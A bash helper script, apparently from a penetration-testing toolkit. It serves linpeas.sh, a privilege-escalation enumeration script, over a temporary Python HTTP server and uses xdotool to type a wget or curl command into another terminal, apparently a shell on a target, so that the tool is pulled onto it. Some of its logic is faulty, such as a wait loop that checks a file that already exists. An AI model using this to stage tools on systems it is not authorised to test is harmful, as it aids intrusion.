#!/bin/bash

clear
sleep 0.2 

echo -e "\e[1;32m       =========================\e[0m"
echo -e "\e[1;32m               FILE UPLOAD       \e[0m"
echo -e "\e[1;32m       =========================\e[0m"

working_directory="$(cd "$(dirname "$0")/.." && pwd)"

get_local_ip() {
    echo "$(ip addr show ens33 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)"
}

generate_random_port() {
    echo $((RANDOM + 1000))
}

check_file_exists() {
    local FILENAME=$1
    if [ ! -f "$FILENAME" ]; then
        echo "File '$FILENAME' does not exist. Please check the filename and try again."
        exit 1
    fi
}

start_http_server() {
    local IP=$(get_local_ip)
    local PORT=$(generate_random_port)

    read -p "Enter the filename to upload (press Enter for default: linpeas.sh): " FILENAME
    FILENAME=${FILENAME:-"$working_directory/miscs/linpeas.sh"}
    check_file_exists "$FILENAME"

    echo "Choose the file transfer method:"
    echo "1) wget"
    echo "2) curl"
    read -p "Enter your choice (1 or 2): " CHOICE

    case $CHOICE in
        1) METHOD="wget";;
        2) METHOD="curl";;
        *) echo "Invalid choice. Defaulting to wget."; METHOD="wget";;
    esac

    guake --hide
    echo "Serving files from: $working_directory/miscs"
    
    # Start the HTTP server in a new Terminator window
    terminator -e "cd $working_directory/miscs && python3 -m http.server $PORT --bind $IP" &
    sleep 3  # Give the server time to start

    # Prepare the command based on user choice
    if [ "$METHOD" == "wget" ]; then
        CMD="wget http://$IP:$PORT/${FILENAME##*/}"
    else
        CMD="curl -O http://$IP:$PORT/${FILENAME##*/}"
    fi

    # Find the last active Terminator window
    LAST_TERMINATOR_WINDOW=$(xdotool search --class "terminator" | tail -n 2)

    # Activate the last active window and execute the command
    xdotool windowactivate "$LAST_TERMINATOR_WINDOW"
    sleep 2 # Small delay to ensure the window is active
    xdotool type "$CMD"
    xdotool key Return

    wait_for_upload "$FILENAME"

    # Stop the HTTP server
    pkill -f "python3 -m http.server"
}

wait_for_upload() {
    local FILENAME=$1
    while [ ! -f "$FILENAME" ]; do
        sleep 1
    done
}

start_http_server
